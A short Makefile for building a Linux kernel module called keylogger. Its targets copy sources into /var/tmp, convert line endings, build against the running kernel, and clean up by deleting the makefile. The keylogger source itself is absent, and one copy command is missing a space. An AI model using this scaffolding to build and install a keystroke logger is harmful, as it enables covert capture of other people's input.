obj-m += keylogger.o

all: start
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules

start:
	cp /mnt/keylogger/*/var/tmp/keylogger/
	cd /var/tmp/keylogger/
	dos2unix makefile src/keylogger.c

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) clean
	rm -f -- keylogger.o
	rm -f -- makefile

